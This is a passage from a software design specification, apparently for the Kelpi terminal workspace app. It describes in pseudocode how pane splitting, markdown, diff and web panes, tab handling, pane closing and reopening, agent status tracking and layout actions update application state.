sourceID = sourcePaneID ?? focusedPaneID;  guard sourceID != null else no-op
guard sourcePane = visible pane with sourceID else no-op   // parked panes NOT eligible
id = newPaneID ?? newUUID()
pane = shellPane(id, workingDirectory: sourcePane.workingDirectory)
layout = splitting(layout, sourceID, direction, id)   // ratio 0.5, new pane second
panes.push(pane)
if (label != null) pane.label = label
setFocus(id)
currentLayoutIndex = null
effect: spawn surface (5.3) for id at pane.workingDirectory
```

**splitPaneAtPath(path, label?: string, direction = "horizontal", newPaneID?: string)**

Same as splitPane but the new pane's working directory is the given path, and the split
source is ALWAYS the focused pane:

```
restoreZoomIfNeeded()
guard sourceID = focusedPaneID else no-op
// note: does NOT verify the focused pane exists in `panes` or in the layout;
// if focusedPaneID is stale the split is a structural no-op but the new pane is
// still appended (orphaned). Invariant: focusedPaneID must always be a live leaf.
id = newPaneID ?? newUUID()
pane = shellPane(id, workingDirectory: path)
layout = splitting(layout, sourceID, direction, id)
panes.push(pane); apply label; setFocus(id); currentLayoutIndex = null
effect: spawn surface (5.3)
```

### 7.3 Scratchpad

**createScratchpad**

```
id = newUUID()
pane = { id, type: "scratchpad", title: "Scratchpad", isEditing: true,
         workingDirectory: home, createdAt/lastActivityAt: now }
if (focusedPaneID != null):
  restoreZoomIfNeeded()
  layout = splitting(layout, focusedPaneID, "horizontal", id)
else:
  layout = leaf(id)
panes.push(pane); setFocus(id); currentLayoutIndex = null
// no surface, no effects
```

**scratchpadContentChanged(paneID, content)** - set `scratchpadContent` on the VISIBLE
pane only (no parked-lane fallback); no-op if absent. Content is persisted to the DB,
never written to a file.

### 7.4 Markdown panes

**openMarkdownFile(filePath, reusePaneID?: string)**

Converging entry point for GUI file-open (picker, drag-drop, Finder Open With) and the
CLI `kelpi open` / `kelpi md` markdown route. `reusePaneID` is the `--here` flow: replace
the calling pane in the layout and PARK it (keep its PTY alive) so closing the markdown
pane restores the terminal.

```
id = newUUID()                                 // never injected
dir = dirname(filePath); fileName = basename(filePath)
pane = { id, type: "markdown", label: fileName, title: fileName,
         workingDirectory: dir, filePath, createdAt/lastActivityAt: now }
branchEffect = none here: the branch reconciler (7.11) observes the new pane's
               directory and dispatches paneBranchChanged(id, ...) itself

if (reusePaneID != null AND oldPane = visible pane with reusePaneID):
  clearSearchIfTargets(reusePaneID)
  restoreZoomIfNeeded()
  pane.parkedSourcePaneID = reusePaneID
  layout = replacing(layout, reusePaneID, leaf(id))
  remove oldPane from panes; parkedPanes.push(oldPane); panes.push(pane)
  setFocus(id); currentLayoutIndex = null
  return branchEffect
// a reusePaneID that names no visible pane falls through to the split path below

sourceID = focusedPaneID ?? allPaneIDs(layout)[0]   // fallback guards the cold-launch
                                                    // file-open drain from clobbering a
                                                    // restored layout whose focus is null
if (sourceID != null):
  layout = splitting(layout, sourceID, "horizontal", id)
else:
  layout = leaf(id)          // only a genuinely empty layout becomes a bare leaf
panes.push(pane); setFocus(id); currentLayoutIndex = null
return branchEffect
```

Caveat (faithful to current behavior): the split branch does NOT run
restoreZoomIfNeeded(). Opening a markdown file while zoomed splits the zoomed leaf; the
stale `savedLayout` (which lacks the markdown pane) is still restored by the next
un-zoom-restoring action, which silently drops the markdown pane from the layout while
leaving it in `panes`. Kelpi keeps this behavior (flagged QUIRK in
`packages/daemon/src/store/reducers/panes.ts`; see Compatibility rationale 5).

**toggleMarkdownEdit(paneID)** (⌘E, markdown panes only)

The client decides which of two paths ⌘E takes (`toggleMarkdownEdit` in
`packages/client/src/App.tsx`); both land on the `set-markdown-editing` reducer action
(`packages/daemon/src/store/reducers/panes.ts`). ⌘E never launches `$EDITOR`.

```
guard pane = visible pane with paneID AND pane.type === "markdown" else no-op

if (pane.externalEditorCommand != null):   // an external editor session is live: END it
  effect: destroySurface(paneID)           // kill the $EDITOR PTY, drop its terminal
                                           // state (markdown-external-editor action=close,
                                           // packages/daemon/src/ws/desktop.ts)
  pane.isEditing = false; pane.externalEditorCommand = null   // back to preview
  return

// otherwise toggle the BUILT-IN editor (content service setMode(view|edit),
// packages/daemon/src/content/service.ts, which dispatches set-markdown-editing
// without a command)
if (pane.isEditing):                       // edit -> view
  pane.isEditing = false; pane.externalEditorCommand = null
  return
wasSearching = (searchingPaneID === paneID)
if (wasSearching) clearSearchIfTargets(paneID)      // the preview is being replaced;
                                                    // a floating find bar would no-op
pane.isEditing = true                      // externalEditorCommand stays null
if (wasSearching) effect: close the markdown find UI for paneID
```

**openExternalEditor(paneID)** (the explicit "Open in $EDITOR" action:
`markdown-external-editor` with `action: "open"`, served by
`packages/daemon/src/ws/desktop.ts`)

```
guard pane = visible pane with paneID AND pane.type === "markdown" else error
guard pane.filePath non-empty else error
cmd = resolve the user's $VISUAL/$EDITOR (and login PATH) from the cached background
      resolution (packages/daemon/src/content/external-editor.ts); error when none resolves.
      The result is a POSIX shell command that opens the file (file path
      single-quote-escaped, editor run via `env PATH=...` so it is findable from an
      app bundle's minimal environment).
effect: destroy any stale surface for paneID   // a clean VT per session; re-entering
                                               // must not replay the last screen
pane.isEditing = true; pane.externalEditorCommand = cmd   // set-markdown-editing with
                                                          // the command; entering edit
                                                          // runs clearSearchIfTargets
effect: spawn surface (5.3) for THIS pane id, cwd = pane.workingDirectory,
        command = cmd, env = the workspace profile env   // the surface hosts the
                                                         // editor, not a shell; the
                                                         // spawn is held by the
                                                         // geometry gate for the
                                                         // client's measurement
if the spawn fails: pane.isEditing = false; pane.externalEditorCommand = null
```

**setMarkdownFontSize(paneID, size)** - guard visible, markdown, NOT editing;
`markdownFontSize = clamp(round(size), 8, 32)` (`set-markdown-font-size` in
`packages/daemon/src/store/reducers/panes.ts`). The increase (+1), decrease (-1) and
reset (14) keybindings compute the absolute size client-side
(`packages/client/src/content/client.ts`) and dispatch this one action through the
content service's `setFontSize`.

### 7.5 Diff panes

**openDiffPane(repoPath, targetPath?: string, reusePaneID?: string)**

```
id = newUUID()
scopeName = (targetPath non-null and non-empty) ? basename(targetPath)
            : basename(repoPath)
pane = { id, type: "diff", label: scopeName, title: `diff: ${scopeName}`,
         workingDirectory: repoPath, filePath: targetPath ?? null,
         createdAt/lastActivityAt: now }
branchEffect = none here: the branch reconciler (7.11) resolves repoPath

reuse branch: identical to openMarkdownFile's reuse branch (park the source).

split branch:
  guard sourceID = focusedPaneID else layout = leaf(id)   // NO allPaneIDs fallback here
  if sourceID: restoreZoomIfNeeded(); layout = splitting(layout, sourceID, "horizontal", id)
panes.push(pane); setFocus(id); currentLayoutIndex = null
return branchEffect
```

Rendering inputs (consumed by the diff view, not this reducer): `workingDirectory` is
the repo path, `filePath` the optional `git diff -- <path>` scope. The view refreshes
on focus regain and via a manual refresh control.

### 7.6 Web panes (opening plus the sidecar actions)

**openWebPane(paneID, tabID, url, reusePaneID?: string, isPrivate = false, sourcePaneID?: string, direction = "horizontal")**

`paneID` and `tabID` are PRE-ALLOCATED by the caller (CLI reply echoes the pane id
before the effect runs; GUI callers mint them too).

```
normalized = normalizeURLInput(url)      // see below
pane = { id: paneID, type: "web", title: "Web", workingDirectory: home,
         createdAt/lastActivityAt: now }
webPanes[paneID] = { tabs: [{ id: tabID, url: normalized, title: "" }],
                     activeTabID: tabID, isPrivate }

reuse branch (reusePaneID names a visible pane): identical park-the-source flow as
  openMarkdownFile (clear search on source, restoreZoomIfNeeded, set
  parkedSourcePaneID, replace in layout, move source to parkedPanes, focus new,
  currentLayoutIndex = null). No effects.

split branch:
  sourceID = sourcePaneID ?? focusedPaneID     // sourcePaneID: header "+" button /
                                               // context menu chooses the split anchor
  if (sourceID != null): restoreZoomIfNeeded();
      layout = splitting(layout, sourceID, direction, paneID)
  else: layout = leaf(paneID)
panes.push(pane); setFocus(paneID); currentLayoutIndex = null
// no surface spawn (web panes have no PTY), no git-branch effect
```

`normalizeURLInput(raw)` (shared with navigate/tab-open):

```
t = raw.trim(); if t === "" return t
if t contains "://" return t
// opaque schemes without "://" (data:, javascript:, mailto:, about:, file:, tel:):
// if t starts with a letter and has a ":" whose scheme part is all
// [letter digit + - .] and the char AFTER the colon is NOT a digit
// (digits mean host:port), return t unchanged
host = t up to first "/" then up to first ":"
scheme = isLocalOrInternalHost(host) ? "http" : "https"
return `${scheme}://${t}`

isLocalOrInternalHost(h): h.lower() is "localhost" | "127.0.0.1" | "0.0.0.0" | "::1",
  or ends with ".local" / ".localhost", or is a well-formed dotted quad in 10/8,
  172.16-31/12, 192.168/16 or 169.254/16 (isPrivateIPv4: a LAN address is a dev server
  far more often than a TLS endpoint; malformed quads with leading zeros, an octet > 255
  or the wrong part count do not match), or contains no "." (single-label -> internal).
```

(`packages/daemon/src/store/reducers/url.ts`.)

**webPaneNavigate(paneID, url)**
- Guard `webPanes[paneID]` exists AND it has a resolved active tab, else no-op.
- Normalize the URL; no-op when the normalized URL is empty or equals the active tab's
  current URL; otherwise optimistically write it into the active tab's `url` in state (so
  a persistence save right now captures the intent before the web view reports back) and
  syncWebPaneHeader(paneID).
- Effect: tell the web-pane host (the Electron shell, driven through
  `packages/daemon/src/webpane/`, honoring `isPrivate`) to load the URL in that tab.

**webPaneBack(paneID) / webPaneForward(paneID) / webPaneReload(paneID, hard = false)**
- Guard sidecar + active tab; effect only: coordinator goBack / goForward /
  reload(hard). `hard` = reload from origin (bypass cache). No state change.

**webPaneZoom(paneID, delta: number | null)**
- Guard sidecar + active tab; effect: adjust the active tab's page zoom by `delta`;
  `null` resets zoom to 1.0. No state change.

**webPaneStateChanged(paneID, tabID, url, title)** (observed navigation feedback)
- Guard sidecar exists and contains `tabID`, else no-op.
- Placeholder rule: if `url` is empty or `"about:blank"` (which appears early in loads
  and on reverts after failed navigations), KEEP the stored URL; otherwise take the
  reported one.
- If neither url nor title actually changed: no-op.
- Write url/title into the tab, then syncWebPaneHeader(paneID): the pane title always
  mirrors the RESOLVED active tab's display label (title -> URL host -> raw url ->
  "New Tab"; activeTab falls back to tabs[0] when activeTabID is stale, so the resolved
  one is what counts), so a tab whose title is still empty shows its host rather than
  keeping the old pane title (`packages/daemon/src/store/reducers/web.ts`).

**webPaneTabOpen(paneID, tabID, url, makeActive = true)**
- Guard sidecar exists; guard `tabID` NOT already present (caller must mint fresh ids).
- Append `{ id: tabID, url: normalizeURLInput(url), title: "" }`.
- If `makeActive`: `activeTabID = tabID`; syncWebPaneHeader(paneID).

**webPaneTabClose(paneID, tabID)**
- Guard sidecar exists and the tab exists.
- If `tabs.length === 1`: no-op. The reducer never converts a tab close into a pane close
  (`packages/daemon/src/store/reducers/web.ts`); the `web-tab-close` wire verb refuses a
  single-tab close with an error before dispatching
  (`packages/daemon/src/webpane/handlers.ts`), and the GUI does not send one: ⌘W on a
  single-tab web pane falls through to the ordinary close-pane binding
  (`packages/client/src/webpane/priority.ts`), so the full closePane flow (focus history,
  layout removal, snapshot, host teardown) runs from there.
- `wasActive = (resolved active tab id === tabID)`. Remove the tab at its index `idx`.
- If wasActive: `activeTabID = tabs[max(idx - 1, 0)].id` (prefer the left neighbor;
  the new first tab when the closed tab was first); syncWebPaneHeader.
- Effect: destroy the closed tab's web view.
- If wasActive AND the find bar is open on this pane (`searchingPaneID === paneID`) AND
  a new active tab exists: additionally re-run the current needle on the new active tab
  (find state is per-tab; the bar is per-pane).

**webPaneTabSelect(paneID, tabID)**
- Guards: sidecar exists; contains tabID; `activeTabID !== tabID` (else no-op).
- `activeTabID = tabID`; syncWebPaneHeader.
- If the find bar is open on this pane: effect to close find on the outgoing tab and
  run the needle on the incoming tab ("retarget find"). Only the active tab ever holds
  live find marks; this keeps `searchClose` (which targets the active tab) a complete
  teardown and prevents background tabs from resurrecting marks.

**webPaneTabCycle(paneID, offset)** (`+1` next, `-1` previous, wraps; ⌘⇧[ / ⌘⇧])
- Client-side, not a reducer action (`cycleTab` in `packages/client/src/App.tsx`, wired
  by `packages/client/src/webpane/priority.ts`).
- Over the mirrored sidecar: guard `tabs.length > 1`; `currentIdx` = index of
  `activeTabID`, defaulting to 0 when it does not resolve.
- `nextIdx = ((currentIdx + offset) % n + n) % n`; send `webPaneTabSelect(paneID,
  tabs[nextIdx].id)`, whose handler does the header sync and the find retarget.

**webPaneTabReorder(paneID, orderedTabIDs)**
- Guard sidecar exists; no-op when the order is unchanged.
- Guard `orderedTabIDs` is an EXACT permutation of the current tab ids (same set, same
  count); otherwise drop the action entirely (never truncate or drop tabs).
- Reorder `tabs` to match.

The console, element-inspector and batch-annotate operations below are the contract of
the daemon's web-pane service (`packages/daemon/src/webpane/service.ts`, `console.ts`,
`inspect.ts`, `batch.ts`), which keeps this state outside the store (1.8); none of them
is a reducer action. They are listed here because they are per-pane and guarded by the
sidecar's existence. web-pane.md is the owning spec.

**Console buffer** (per pane, ring buffer capacity 1000, oldest dropped, drops counted):
- `webConsoleLineReceived(paneID, line)`: guard sidecar; append to the ring buffer;
  then fan the line out to streaming console subscribers.
- The append and the fan-out happen in one place (`packages/daemon/src/webpane/console.ts`),
  so there is no separate `webConsoleLineAppended` step; the guarantee "subscribers see
  the line only after it is in the buffer" holds because the append runs first
  (Compatibility rationale 4).
- `webConsoleClear(paneID)`: guard sidecar; clear the buffer (the line sequence number
  keeps counting; used by `kelpi web console --clear`).
- `webConsoleAcknowledgeDrops(paneID)`: guard sidecar; reset the buffer's
  dropped-since-last-drain counter to 0 (dispatched right after a `kelpi web console`
  reply so drop counts are reported once).

**Element inspector (single-shot picker)**:
- `webInspectArmedFor(paneID, sendTo: string | null, nonce)`: guard sidecar; set
  `inspectorArmed = true`, `pendingInspectSendTo = sendTo`,
  `pendingInspectNonce = nonce`. (The page-side listener was already armed by the
  coordinator; this records the routing side. The nonce is checked against every
  delivered payload; mismatch means a page script tried to spoof the channel.)
- `webInspectDisarm(paneID)`: guard sidecar; clear all three fields. Called on
  delivered click (auto-disarm), tab close, or destination-gone.
- `webInspectResultReceived(paneID, result)`: guard sidecar; append to
  `inspectResultQueue`; cap 32 entries, dropping the OLDEST overflow.
- `webInspectResultClear(paneID)`: guard sidecar; empty the queue.

**Batch annotate**:
- `webBatchInspectBegin(paneID)`: guard sidecar; `batchInspect = { items: [],
  focusedItemID: null, panelVisible: true }`. (The parent arms the picker sticky.)
- `webBatchItemAdded(paneID, item)`: guard sidecar AND an active batch; append.
- `webBatchItemCommentChanged(paneID, itemID, comment)`: guard sidecar, active batch,
  item present; set the item's comment.
- `webBatchItemRemoved(paneID, itemID)`: guard sidecar + active batch; remove matches.
- `webBatchInspectCleared(paneID)`: guard sidecar; `batchInspect = null` (abort without
  sending; the parent also disarms the sticky picker).
- `webBatchPanelVisible(paneID, visible)`: guard sidecar, active batch, AND the flag
  actually changes; set it. Items persist across hide/show; the parent pairs this with
  picker arm/disarm and on-page marker show/hide.
- `webBatchItemFocused(paneID, itemID: string | null)`: guard sidecar + active batch;
  set `focusedItemID` (null clears). Drives bidirectional row<->page highlight.

**webPaneSetIsPrivate(paneID, enabled)**
- Guard sidecar exists AND the flag changes; set `isPrivate`. Pure state mutation; the
  parent destroys the pane's web-view coordinator alongside so tabs rebuild against the
  new (private vs persistent) data store.

### 7.7 Closing panes

**closePane(paneID)**

```
clearSearchIfTargets(paneID)
restoreZoomIfNeeded()

// A) UNPARK branch: this pane replaced a parked terminal (`kelpi open --here`).
if (closing = visible pane with paneID) AND (closing.parkedSourcePaneID != null)
   AND (parked = parkedPanes[closing.parkedSourcePaneID]) exists:
  markdownHasSurface = closing.type === "markdown" AND closing.externalEditorCommand != null
  remove parked from parkedPanes
  remove closing from panes
  panes.push(parked)                                   // the terminal returns
  layout = replacing(layout, paneID, leaf(parked.id))  // swap back in place
  focusHistory = focusHistory without paneID and without parked.id  // defensive scrub
  focusedPaneID = parked.id       // DIRECT assignment, no history push
  currentLayoutIndex = null
  if (markdownHasSurface) effect: destroySurface(paneID)  // the $EDITOR PTY it hosted
  return

// B) NORMAL close
paneType = visible pane's type, defaulting to "shell" when the pane is unknown
hasBackingSurface = paneType === "shell" OR (pane?.isUsingExternalEditor ?? false)
isWebPane = paneType === "web"

if (pane = visible pane with paneID):        // snapshot for reopen
  snapshotWebState = (pane.type === "web" AND webPanes[paneID] exists
                      AND NOT webPanes[paneID].isPrivate) ? webPanes[paneID] : null
  recentlyClosedPanes.push({ workingDirectory, label, type, filePath,
      scratchpadContent, agentSessionID, agentKind, markdownFontSize,
      webState: snapshotWebState })
  if (recentlyClosedPanes.length > 10) drop the OLDEST (front)

if (isWebPane) delete webPanes[paneID]
remove pane from panes
layout = removing(layout, paneID)
currentLayoutIndex = null
focusHistory = focusHistory without paneID   // scrub even when it wasn't focused

if (focusedPaneID === paneID):
  focusedPaneID = popFocusFromHistory(excluding: paneID)  // previously-focused pane
                  ?? allPaneIDs(layout)[0]                // fallback: layout order
                  ?? null                                 // last pane closed
  // DIRECT assignment; the closing pane never enters its own history.

effects:
  if (hasBackingSurface) destroySurface(paneID)   // kills the PTY / editor process
  if (isWebPane) destroy the pane's web-view coordinator
  // both can apply in principle (defensive); today web panes never have a surface
```

Notes:
- Closing the LAST pane leaves the workspace with `panes = []`, `layout = empty`,
  `focusedPaneID = null`. The reducer permits this; the app-level ⌘W handler maps
  "close last pane" to workspace deletion (with the active-agents confirm gate). The
  workspace-delete CLI/GUI guard uses `activeAgentCount` (1.10).
- Closing an id that names NO visible pane still resets `currentLayoutIndex`, scrubs
  history, runs the (no-op) layout removal, and fires a destroySurface effect (type
  defaults to shell); all harmless.
- Private web panes snapshot with `webState: null`, so reopen does NOT restore their
  tabs (see 7.9 for the resulting edge).

**paneProcessTerminated(paneID)** (the pane's child process exited)

Three branches, checked in order:

```
1. Parked pane died (SIGHUP etc.):
   if parkedPanes contains paneID:
     remove it from parkedPanes
     for every VISIBLE pane p with p.parkedSourcePaneID === paneID:
       p.parkedSourcePaneID = null          // its close will now be a normal close
     effect: destroySurface(paneID)
     return

2. Markdown external editor exited:
   if visible pane exists, type === "markdown", externalEditorCommand != null:
     pane.isEditing = false; pane.externalEditorCommand = null   // back to preview;
     effect: destroySurface(paneID)          // the file watcher picks up saved changes
     return

3. Otherwise, only if the pane is a SHELL pane (or names no visible pane): dispatch
   closePane(paneID). A non-shell pane whose process exits is left open (a markdown
   pane is already back in preview by branch 2, or by an explicit editor close); the
   daemon merely releases its terminal state so the next `$EDITOR` session starts on a
   clean VT (`packages/daemon/src/store/reducers/panes.ts`, `packages/daemon/src/boot/compose.ts`).
```

### 7.8 Focus

**focusPane(paneID)** - `setFocus(paneID)` (3.5; pushes the previous focus onto
history). No existence check: focusing an unknown id sets it verbatim (callers pass
real ids).

**focusNextPane / focusPreviousPane**
- Guard `focusedPaneID != null` AND the layout yields a next/previous id (needs the
  current id present and >= 2 panes), else no-op.
- Target = allPaneIDs order, +1 / -1 with wraparound. `setFocus(target)`.

`clearPaneStatus` interaction: the client's pane grid starts a 600ms timer when a
`waitingForInput` pane gains focus and then sends `clear-pane-status` (`dwellClear` in
`packages/client/src/App.tsx`), which dispatches `clearPaneStatus` (7.10), so merely
looking at a waiting pane acknowledges it.

### 7.9 Reopen closed pane

**reopenClosedPane** (⌘⇧T-style)

```
snapshot = recentlyClosedPanes.pop()          // LIFO; guard non-empty else no-op
guard focusedPaneID != null else no-op
// EDGE (kept): the snapshot is popped BEFORE the focus guard, so with no focused pane
// the snapshot is consumed and permanently lost; the wire reply
// (packages/daemon/src/ws/panes.ts) is an error rather than a pane id.

id = newUUID()
pane = { id, label: snapshot.label, type: snapshot.type,
         workingDirectory: snapshot.workingDirectory, filePath: snapshot.filePath,
         isEditing: snapshot.type === "scratchpad",       // scratchpads reopen editing
         scratchpadContent: snapshot.scratchpadContent,
         agentKind: snapshot.agentKind,                   // display continuity
         agentProfileName: snapshot.agentProfileName,     // same kind of last-known value
         markdownFontSize: snapshot.markdownFontSize }
// note: agentSessionID is NOT restored onto the pane; title/gitBranch/status reset.

layout = splitting(layout, focusedPaneID, "horizontal", id)
panes.push(pane)
if (snapshot.type === "web" AND snapshot.webState != null):
  webPanes[id] = snapshot.webState
  // EDGE: a private web pane closed earlier has webState null, so the reopened pane
  // gets NO sidecar entry: a web pane with no tabs. The UI must tolerate a missing
  // sidecar (treat as a blank tab); kept, see Compatibility rationale 5.
setFocus(id); currentLayoutIndex = null

if (snapshot.type is markdown | scratchpad | diff | web): no effects; done.

// shell: respawn and optionally resume the agent (the reopen channel in
// packages/daemon/src/ws/panes.ts reads the snapshot BEFORE dispatching, since the
// reducer pops it and the restored pane does not carry agentSessionID)
effect:
  cmd = snapshot.agentSessionID != null
        ? resumeCommand(snapshot.agentKind ?? "claude", snapshot.agentSessionID)
        : null
  env = resolveProfileEnv(cmd != null && snapshot.agentProfileName != null
        ? snapshot.agentProfileName     // a resume runs under the profile the session
        : profileName ?? "default")     // was launched under (spawnPaneIfShell's
                                        // sessionProfileName); unrecorded -> the
                                        // workspace's, so the agent stays on the
                                        // workspace's account
  spawnSurface(id, pane.workingDirectory, env)
  if (cmd != null):            // null = unsafe session id; skip resume silently
    sleep 2 seconds            // REOPEN_RESUME_SETTLE_MS: let the shell finish starting
    if the PTY is gone (pane closed again meanwhile): skip
    typeIntoPane(id, cmd); pressEnter(id)   // sendText, bare: false = text + Enter
```

(The parallel "restart-restore" flow that resumes agents after a DAEMON restart lives in
the boot restore (`applyLoadReset` in `packages/daemon/src/store/snapshot.ts`, see
app-state-core.md): it captures resume tuples from persisted panes at state load, clears
`agentSessionID`s, and types the same `resumeCommand` into respawned panes. This
workspace reducer contributes `sessionEnded`'s clearing, which is what prevents an
already-exited session from being resumed, `agentKind`, which picks the command, and
`agentProfileName`, which picks the env.)

### 7.10 Agent lifecycle and status

All of these use `mutatePane` (3.6): they apply to VISIBLE OR PARKED panes, and no-op
for unknown ids. The transitions are `reduceAgentEvent` in
`packages/core/src/agent/machine.ts`, applied by
`packages/daemon/src/store/reducers/agent.ts`.

Status state machine:

```
                 agentStarted            agentStopped(bg=0)
        idle ------------------> running -------------------> waitingForInput
         ^                        ^   |                            |    ^
         |     clearPaneStatus    |   | agentStopped(bg>0)         |    | agentError
         +------------------------+   +--(stays running)----------+    | (from any)
              (only from waiting)     agentStarted (re-entry, timer restarts)
setPaneStatus(any) = manual override, shell panes only
notification(bg)   = same transition as agentStopped(bg)
```

**agentStarted(paneID, agent = "claude")**
(fired by the `start` lifecycle event: Claude `UserPromptSubmit` hook, etc.)
- `agentStartedAt = now` on EVERY start, including one that arrives while already
  `running`: a start mid-run means the previous stop was missed, so it is treated as a
  fresh run and the elapsed clock restarts.
- `status = "running"`.
- `agentKind = agent`.
- `backgroundTaskCount = 0` (a fresh turn supersedes any background snapshot).

**agentStopped(paneID, backgroundTaskCount)**
(fired by the `stop` lifecycle event; the CLI forwards the hook payload's live
`background_tasks` count, 0 when absent/malformed)
- `backgroundTaskCount = backgroundTaskCount`.
- If count > 0: the turn ended but background shells/subagents are still in flight;
  KEEP `status = "running"` (force it, so repeat Stops as each background unit finishes
  are idempotent no-ops); if somehow not already running, set `agentStartedAt = now`.
  (The parent reducer separately suppresses the "waiting for input" notification and
  dock bounce for this pane when the count is > 0.)
- Else (count == 0): `status = "waitingForInput"`.

Self-recovery: when background work finishes it re-invokes the agent, producing
`agentStarted` (resets count to 0), and the eventual final Stop arrives with count 0.

**notification(paneID, title, body, backgroundTaskCount)**
(fired by the `notification` lifecycle event: the Claude `Notification` hook)
- Takes exactly the `agentStopped` transition with the same count (shared `applyStop`):
  count > 0 keeps `status = "running"`, count 0 sets `"waitingForInput"`.
- Additionally raises an `agentNotification` pending notification carrying the hook's
  title and body (in place of the generic "waiting for input" one that `agentStopped`
  raises). agent-lifecycle.md is the owning spec.

**agentError(paneID)**
- `status = "waitingForInput"` (an errored agent needs attention, same visual state as
  awaiting input; NOT idle).
- `backgroundTaskCount = 0`.

**setPaneStatus(paneID, status)** (manual override from the pane context menu)
- Guard the pane (visible OR parked) exists AND `type === "shell"` (status is a
  shell-only concept; defense in depth, the menu is already shell-only).
- If `status === "running"` and the pane was not running: `agentStartedAt = now`.
- `status = status`.
- `backgroundTaskCount = 0` (a manual override takes control; a stale "N running"
  badge must not linger).

**sessionStarted(paneID, sessionID, agent = "claude", profileName?)**
(fired by the `session-start` event, i.e. the SessionStart hook; also dual-fired by
other hooks that carry a session_id)
- `agentSessionID = sessionID`.
- `agentKind = agent`. (This is why untagged dual-fires from codex would flip the kind
  back to claude; the CLI tags every fire.)
- `agentProfileName = profileName` when the event carries a non-empty one (the hook
  reports the `KELPI_PROFILE` of the agent's own environment); an event without one
  (an older CLI) keeps the last-known value.
- `backgroundTaskCount = 0` (a brand-new session inherits no background work; also
  bounds a stuck "running" if the final empty Stop was lost while the daemon was down).
- Does NOT touch `status` or `agentStartedAt` (status rides `agentStarted`).

**sessionEnded(paneID, sessionID)** (SessionEnd hook; issue #178)
- If `agentSessionID === sessionID`: set `agentSessionID = null` AND
  `agentProfileName = null` (a profile with no session to resume must not pin the pane's
  next spawn; an older CLI never reports a new one, so "keep last-known" would hold a
  stale name forever). Otherwise leave both alone.
- The match guard matters: `/clear` and compaction fire SessionEnd(oldID) alongside
  SessionStart(newID) and the two can arrive in EITHER order; the guard keeps the live
  session tracked regardless. Clearing prevents an exited session from being
  `--resume`d on next launch or reopen.
- Codex has no SessionEnd event, so a stale codex session id can outlive the process
  (documented limitation).

**clearPaneStatus(paneID)**
- Only if the pane's current status is `"waitingForInput"`: set `"idle"`.
- Never clobbers `"running"` (the agent may have started again before the view layer's
  600ms focus-dwell timer fired this action).

### 7.11 Working directory, title, branch tracking

**paneTitleChanged(paneID, title)** (terminal reported a title change)
- mutatePane: `title = title; lastActivityAt = now`.

**paneDirectoryChanged(paneID, directory)** (terminal reported a pwd change, OSC 7)
- mutatePane: `workingDirectory = directory; lastActivityAt = now`.
- No effect of its own: the branch reconciler below observes the change.

**paneBranchChanged(paneID, branch: string | null)**
- mutatePane: `gitBranch = branch`. (Null clears the badge, e.g. cwd left the repo or
  git errored.)

Branch detection is one store reconciler (`packages/daemon/src/git/branch.ts`, the only
producer of `paneBranchChanged`) rather than per-call-site effects: every change to a
pane's working directory (an OSC 7 report, a split inheriting a cwd, markdown/diff open
setting the parent dir or repo path, a boot restore) schedules
`git rev-parse --abbrev-ref HEAD` in that directory, debounced 120 ms per pane
(`BRANCH_RESOLVE_DEBOUNCE_MS`) and cached 3 s per directory (`BRANCH_CACHE_TTL_MS`); a
watched worktree's HEAD change (graft-git.md) re-resolves every pane inside it.
`paneBranchChanged` is dispatched only when the result differs from the pane's current
`gitBranch`, and only if the pane still has the directory that was looked up. Detached
HEAD yields the literal `"HEAD"`. It is best-effort; a non-checkout or a git failure
resolves to null, never to an error.

### 7.12 Layout actions

**updateSplitRatio(splitPath, ratio)** (GUI divider drag; also the backing semantics of
`kelpi pane resize`)
- `layout = updatingSplitRatio(layout, splitPath, ratio)` (1.7; clamp 0.1..0.9; bad
  paths leave the layout unchanged).
- `currentLayoutIndex = null`.

**movePane(paneID, targetPaneID, zone)** (GUI drag-drop; CLI `pane move --target X
--above/--below/--left-of/--right-of Y` maps its edge flags to zones
above->top, below->bottom, left-of->left, right-of->right)
- Guard BOTH ids name visible panes, else no-op.
- `layout = movingPane(layout, paneID, targetPaneID, zone)` (1.6).
- `setFocus(paneID)`; `currentLayoutIndex = null`.
- Edge: `paneID === targetPaneID` passes the guards; the layout is unchanged (movingPane
  no-ops) but focus is still set and the layout index still resets.

**movePaneInDirection(direction)** (keyboard "move pane left/right/up/down"; the CLI's
fire-and-forget directional `kelpi pane move <dir>` for the calling pane)
- Guard `zoomedPaneID === null` (moving while zoomed is a no-op, NOT an un-zoom).
- Guard `focusedPaneID != null`.
- `neighbor = neighborPaneID(layout, focusedPaneID, direction)` (geometric, 1.6);
  guard non-null.
- `layout = swappingLeaves(layout, focusedPaneID, neighbor)`: the two panes exchange
  positions; every split direction and ratio is preserved; focus stays on the same pane
  id (now in the neighbor's slot).
- `currentLayoutIndex = null`.

**cycleLayout** (⌘⇧Space / `kelpi layout cycle`)
- Guard `panes.length > 1` else no-op.
- restoreZoomIfNeeded().
- `nextIndex = currentLayoutIndex == null ? 0 : (currentLayoutIndex + 1) % 5`.
  (A hand-modified layout restarts the cycle at even-horizontal.)
- `ids = allPaneIDs(layout)`; if the focused pane is in the list but not first, move it
  to the front (it becomes "main" in the main-* layouts; relative order of the rest is
  preserved).
- `layout = buildLayout(PREDEFINED[nextIndex], ids)`; `currentLayoutIndex = nextIndex`.

**selectLayout(predefined)** (`kelpi layout select <name>` / menu)
- Guard `panes.length > 1`; restoreZoomIfNeeded(); look up the layout's index in the
  canonical order (0..4).
- Same focused-pane-to-front reorder; build; `currentLayoutIndex = index`.

**toggleZoomPane**
- If currently zoomed (`zoomedPaneID != null`): restore `savedLayout` (if present) into
  `layout`; clear `zoomedPaneID` and `savedLayout`.
- Else, if `focusedPaneID != null` AND `panes.length > 1`: `savedLayout = layout`;
  `zoomedPaneID = focusedPaneID`; `layout = leaf(focusedPaneID)`.
- Single-pane workspaces cannot zoom. `currentLayoutIndex` is untouched in both
  directions.
- While zoomed, resize/split-type actions either restore first (5.1) or no-op
  (movePaneInDirection); `updateSplitRatio` on the zoomed leaf layout is a structural
  no-op (no split nodes) but still clears the layout index.

### 7.13 Repo associations

**addRepoAssociation(assoc)** - append to `repoAssociations`.
**removeRepoAssociation(id)** - remove by association id.
(Population/auto-detection logic lives outside this reducer.)

### 7.14 Search / find

One find bar per workspace at a time (`searchingPaneID`). Three backends by pane type:
terminal search (shell), markdown-preview find, web-view find (per active tab).
`searchTotal` = number of matches, `searchSelected` = current match index; both start
null.

**toggleSearch** (find keybinding)
- Guard: there is a focused pane AND its type is `"shell"`, `"web"`, or
